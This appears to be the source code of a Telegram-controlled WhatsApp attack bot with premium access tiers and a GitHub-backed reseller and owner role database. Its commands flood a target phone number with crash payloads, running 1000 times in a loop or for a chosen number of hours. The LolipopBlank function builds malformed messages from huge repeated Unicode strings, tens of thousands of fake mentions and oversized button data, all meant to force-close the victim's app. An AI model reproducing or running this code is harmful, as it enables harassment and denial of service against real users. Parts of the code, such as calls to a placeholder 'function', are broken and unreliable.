│USERS : ${jid}
│SIGNAL : Invisible Force Close
│STATUS : SEND TO TARGET
╰───────────────────────╯
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });

    await bot.editMessageCaption(`
╭─「 SUCCESSFULLY SEND 」─╮
│USERS : ${jid}
│STATUS : Force Close Invisible
│OWNERS : @Xatanicvxii
╰─────────────────────╯
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }],
          [{ text: "KEMBALI", callback_data: "back" }]
        ]
      }
    });

    // Jalankan Function
    for (let i = 0; i < 1000; i++) {
    await function(jid);
    await function(jid);
    }

  } catch (err) {
    await bot.sendMessage(chatId, `
╭─「 SYSTEM ERROR 」─╮
│  Execution failed.
│  Details : ${err.message}
╰──────────────────────╯
`, { parse_mode: "Markdown" });
  }
});

bot.onText(/\/durationdelay (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const randomImage = getRandomImage();

  // Parsing parameter
  const args = match[1].split(",");
  const targetNumber = args[0]?.trim();
  const hours = parseFloat(args[1] || "0");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;

  // Cek premium
  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
╭━━━〔 ACCESS INFORMATION 〕━━━
┃Status : There isn't any Access
┃Reason : Premium Access Only
┃Owners: @Xatanicvxii
╰━━━━━━━━━━━━━━━━━━━━━━━━━
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Contact", url: "https://t.me/xatanicvxii" }],
          [
            { text: "Channel", url: "https://t.me/infoTredict" },
            { text: "Room Public", url: "https://t.me/publicxata" }
          ]
        ]
      }
    });
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `
⚠️ *System Warning*  
No active WhatsApp sessions detected.  
Please run /connect to initialize VoltraLink.
    `, { parse_mode: "Markdown" });
  }

  if (!targetNumber || !hours || hours <= 0) {
    return bot.sendMessage(chatId, `
⚠️ *Invalid Input*  
Format: \`/lolipopdelay 62xx,3\`  
(3 = durasi dalam jam)
    `, { parse_mode: "Markdown" });
  }

  const sent = await bot.sendPhoto(chatId, randomImage, {
    caption: `
╭─「 INFORMATION BUG ONLINE 」─╮
│ USERS : ${jid}
│ ACTIVE : ${sessions.size}
│ STATUS : Loading Delay Target
│ DURATION : ${hours} Jam
╰────────────────────────╯
`,
    parse_mode: "Markdown"
  });

  try {
    const endTime = Date.now() + (hours * 60 * 60 * 1000);
    let attackCount = 0;

    // Loop hingga durasi habis
    while (Date.now() < endTime) {
      attackCount++;
      await function(jid);
      await new Promise(resolve => setTimeout(resolve, 1500));

      const remainingMs = endTime - Date.now();
      const remainingH = Math.floor(remainingMs / (1000 * 60 * 60));
      const remainingM = Math.floor((remainingMs % (1000 * 60 * 60)) / (1000 * 60));

      console.log(`[LolipopDelay] Attack #${attackCount} → ${jid} | Sisa ${remainingH}h ${remainingM}m`);

      await new Promise(r => setTimeout(r, 2000)); // delay antar serangan biar awet
    }

    await bot.sendMessage(chatId, `
✅ *Duration Finished*  
Target: ${jid}  
Total Serangan: ${attackCount}  
Durasi: ${hours} jam
    `, { parse_mode: "Markdown" });

  } catch (err) {
    await bot.sendMessage(chatId, `
╭─「 SYSTEM ERROR 」─╮
│  Execution failed.
│  Details : ${err.message}
╰──────────────────────╯
`, { parse_mode: "Markdown" });
  }
});

//FUNCTION MU
async function LolipopBlank(sock, target) {
  let crash = JSON.stringify({ action: "x", data: "x" });

  const bellaMsg = generateWAMessageFromContent(target, {
    stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "Suka Permen" + "ꦾ".repeat(77777),
      publisher: "t.me/xatanicvxii",
      stickers: [
        { fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp", isAnimated: false, mimetype: "image/webp" },
        { fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp", isAnimated: false, mimetype: "image/webp" },
        { fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp", isAnimated: false, mimetype: "image/webp" },
        { fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp", isAnimated: false, mimetype: "image/webp" },
        { fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp", isAnimated: false, mimetype: "image/webp" },
        { fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp", isAnimated: false, mimetype: "image/webp" },
        { fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp", isAnimated: false, mimetype: "image/webp" },
        { fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp", isAnimated: false, mimetype: "image/webp" }
      ],
      fileLength: "3662919",
      contextInfo: {
        mentionedJid: [
          "6285215587498@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
        ]
      }
    }
  }, {});

  await sock.relayMessage(target, bellaMsg.message, { messageId: bellaMsg.key.id });

  const lolipop = '_*~@2~*_\n'.repeat(10500);
  const gula = 'ោ៝'.repeat(5000);
  const listMents = Array.from({ length: 30000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`);
  const imageCrash = "https://files.catbox.moe/4tuto4.jpg"; // Bisa Diganti Kalau Mau

  const album = await generateWAMessageFromContent(target, {
    albumMessage: {
      expectedImageCount: 999,
      expectedVideoCount: 666
    }
  }, { userJid: target, upload: sock.waUploadToServer });

  await sock.relayMessage(target, album.message, { messageId: album.key.id });

  for (let i = 0; i < 10; i++) { // dibatasi biar aman
    const msg = await generateWAMessage(target, {
      image: { url: imageCrash },
      caption: "Permen Lolipop Bu" + "ោ៝" + "ꦾ".repeat(6000),
    }, { upload: sock.waUploadToServer });
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
  }

  const albumCrash = generateWAMessageFromContent(target, {
    viewOnceMessageV2: {
      message: {
        albumMessage: {
          listResponseMessage: {
            title: "Bella Cantik",
            listType: 4,
            buttonText: { displayText: "🩸" },
            sections: [],
            singleSelectReply: { selectedRowId: "⌜⌟" },
          },
          contextInfo: {
            mentionedJid: listMents,
            externalAdReply: {
              title: "✌️",
              body: "🪬",
              mediaType: 1,
              nativeFlowButtons: [
                { name: "payment_info", buttonParamsJson: crash + lolipop + gula + "{".repeat(20000) },
                { name: "call_permission_request", buttonParamsJson: crash + lolipop + gula + "{".repeat(20000) },
              ],
            },
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, albumCrash.message, { messageId: albumCrash.key.id });

  console.log(chalk.red(`Blank Beta ${target}`));
}

// END FUNCTION 

//DATABAS SAMAIN DI SC NYA
try {
  const { Octokit } = (await import("@octokit/rest"));

  const GITHUB_TOKEN = "ghp_";
  const GITHUB_REPO = "Owner/Repo";
  const [GH_OWNER, GH_REPO] = GITHUB_REPO.split("/");
  const octokit = new Octokit({ auth: GITHUB_TOKEN });

  const FILES = {
    token: "tokens.json",
    reseller: "resellers.json",
    mod: "mods.json",
    owner: "owners.json",
  };

  function isDev(userId) {
    const idStr = String(userId);
    const owners = (global.config && Array.isArray(global.config.OWNER_ID)) ? global.config.OWNER_ID : [];
    return owners.includes(idStr);
  }

  async function getFileContent(filePath) {
    try {
      const { data } = await octokit.repos.getContent({ owner: GH_OWNER, repo: GH_REPO, path: filePath });
      const content = Buffer.from(data.content, "base64").toString();
      return { content: JSON.parse(content), sha: data.sha };
    } catch (e) {
      if (e.status === 404) {
        const emptyArr = [];
        const resp = await octokit.repos.createOrUpdateFileContents({
          owner: GH_OWNER, repo: GH_REPO, path: filePath,
          message: `init ${filePath}`,
          content: Buffer.from(JSON.stringify(emptyArr, null, 2)).toString("base64"),
          committer: { name: "bot", email: "bot@example.com" },
          author: { name: "bot", email: "bot@example.com" },
        });
        return { content: [], sha: resp.data.content.sha };
      }
      throw e;
    }
  }

  async function updateFileContent(filePath, json, sha, committer = { name: "bot", email: "bot@example.com" }) {
    await octokit.repos.createOrUpdateFileContents({
      owner: GH_OWNER, repo: GH_REPO, path: filePath,
      message: `Update ${filePath}`,
      content: Buffer.from(JSON.stringify(json, null, 2)).toString("base64"),
      sha,
      committer, author: committer,
    });
  }

  async function isAuthorized(id, types = []) {
    const idStr = String(id);
    for (const type of types) {
      const file = FILES[type];
      const { content } = await getFileContent(file);
      if (Array.isArray(content) && content.includes(idStr)) return true;
    }
    return false;
  }

  async function addUser(role, userId, allowedBy) {
    const matrix = {
      token: ["reseller", "mod", "owner"],
      reseller: ["mod", "owner"],
      mod: ["owner"],
      owner: [],
    };
    const allowedTypes = matrix[role] || [];
    if (!isDev(allowedBy) && !(await isAuthorized(allowedBy, allowedTypes))) return "Tidak punya izin.";

    const file = FILES[role];
    const { content, sha } = await getFileContent(file);
    const userIdStr = String(userId);
    if (content.includes(userIdStr)) return "User sudah terdaftar.";
    content.push(userIdStr);
    await updateFileContent(file, content, sha);
    return `Berhasil menambahkan ${userIdStr} ke ${role}`;
  }

  async function removeUser(role, userId, allowedBy) {
    const matrix = {
      token: ["reseller", "mod", "owner"],
      reseller: ["mod", "owner"],
      mod: ["owner"],
      owner: [],
    };
    const allowedTypes = matrix[role] || [];
    if (!isDev(allowedBy) && !(await isAuthorized(allowedBy, allowedTypes))) return "Tidak punya izin.";

    const file = FILES[role];
    const { content, sha } = await getFileContent(file);
    const userIdStr = String(userId);
    if (!content.includes(userIdStr)) return "User tidak ditemukan.";
    const updated = content.filter((u) => u !== userIdStr);
    await updateFileContent(file, updated, sha);
    return `Berhasil menghapus ${userIdStr} dari ${role}`;
  }

  function extractTextFromMessage(msg) {
    try {
      const m = msg.message || {};
      if (m.conversation) return m.conversation;
      if (m.extendedTextMessage && m.extendedTextMessage.text) return m.extendedTextMessage.text;
      if (m.imageMessage && m.imageMessage.caption) return m.imageMessage.caption;
      if (m.videoMessage && m.videoMessage.caption) return m.videoMessage.caption;
      return "";
    } catch { return ""; }
  }

  function jidToBareId(jid) {
    // "628xx@s.whatsapp.net" -> "628xx"
    return String(jid).split("@")[0];
  }

  async function isMemberGroup(sock, jid, userJid) {
    try {
      const meta = await sock.groupMetadata(jid);
      const uid = String(userJid);
      return meta.participants.some(p => p.id === uid);
    } catch {
      // Kalau bukan grup, anggap false
      return false;
    }
  }

  function parseCmd(line) {
    const text = (line || "").trim();
    const m = text.match(/^([./!#])([a-zA-Z]+)(?:\s+(.+))?$/);
    if (!m) return null;
    return { cmd: m[2].toLowerCase(), args: (m[3] || "").trim() };
  }

  async function handleRoleCommand(sock, chatJid, senderJid, parsed) {
    const fromId = jidToBareId(senderJid);
    const inGroup = await isMemberGroup(sock, chatJid, senderJid);
    if (!inGroup) {
      await sock.sendMessage(chatJid, { text: "❌ Kamu bukan anggota group!" });
      return;
    }

    const reply = async (t) => sock.sendMessage(chatJid, { text: t });

    const args = parsed.args;
    switch (parsed.cmd) {
      case "addtoken": {
        const id = args;
        if (!id) return reply("⚠️ Format: `/addtoken <Token>`");
        const res = await addUser("token", id, fromId);
        return reply(res);
      }
      case "deltoken": {
        const id = args;
        if (!id) return reply("⚠️ Format: `/deltoken <Token>`");
        const res = await removeUser("token", id, fromId);
        return reply(res);
      }
      case "addreseller": {
        const raw = args;
        if (!raw) return reply("⚠️ Format: `/addreseller <user_id>`");
        const id = raw.replace(/\D/g, ""); // ambil digit saja
        const res = await addUser("reseller", id, fromId);
        return reply(res);
      }
      case "delreseller": {
        const raw = args;
        if (!raw) return reply("⚠️ Format: `/delreseller <user_id>`");
        const id = raw.replace(/\D/g, "");
        const res = await removeUser("reseller", id, fromId);
        return reply(res);
      }
      case "addmod": {
        const raw = args;
        if (!raw) return reply("⚠️ Format: `/addmod <user_id>`");
        const id = raw.replace(/\D/g, "");
        const res = await addUser("mod", id, fromId);
        return reply(res);
      }
      case "delmod": {
        const raw = args;
        if (!raw) return reply("⚠️ Format: `/delmod <user_id>`");
        const id = raw.replace(/\D/g, "");
        const res = await removeUser("mod", id, fromId);
        return reply(res);
      }
      case "addowner": {
        const raw = args;
        if (!raw) return reply("⚠️ Format: `/addowner <user_id>`");
        const id = raw.replace(/\D/g, "");
        const res = await addUser("owner", id, fromId);
        return reply(res);
      }
      case "delowner": {
        const raw = args;
        if (!raw) return reply("⚠️ Format: `/delowner <user_id>`");
        const id = raw.replace(/\D/g, "");
        const res = await removeUser("owner", id, fromId);
        return reply(res);
      }
      default: return;
    }
  }

  if (!global.__GITHUB_ROLE_CMDS_PATCHED__) {
    global.__GITHUB_ROLE_CMDS_PATCHED__ = true;

    const sessions = (global.sessions && typeof global.sessions.get === "function") ? global.sessions : null;

    function attachToSock(sock) {
      if (!sock || sock.__roleHandlerAttached) return;
      sock.__roleHandlerAttached = true;
      try {
        sock.ev.on("messages.upsert", async (m) => {
          try {
            const up = m;
            const msgs = (up && up.messages) ? up.messages : [];
            for (const message of msgs) {
              if (!message.message) continue;
              const chatJid = message.key.remoteJid;
              const senderJid = message.key.participant || message.key.remoteJid;
              const text = extractTextFromMessage(message);
              const parsed = parseCmd(text);
              if (!parsed) continue;
              await handleRoleCommand(sock, chatJid, senderJid, parsed);
            }
          } catch (err) {
            console.error("[role-cmd] error:", err);
          }
        });
      } catch (err) {
        console.error("[role-cmd] attach error:", err);
      }
    }

    if (sessions && typeof sessions.forEach === "function") {
      try {
        sessions.forEach((s) => attachToSock(s));
      } catch {}
    }

    setInterval(() => {
      try {
        if (sessions && typeof sessions.forEach === "function") {
          sessions.forEach((s) => attachToSock(s));
        }
        if (global.sock) attachToSock(global.sock);
      } catch {}
    }, 3000);
  }

} catch (err) {
  console.warn("[Octokit Role DB] modul tidak aktif:", err && err.message);
}
})();

// ===== END SELESAI =====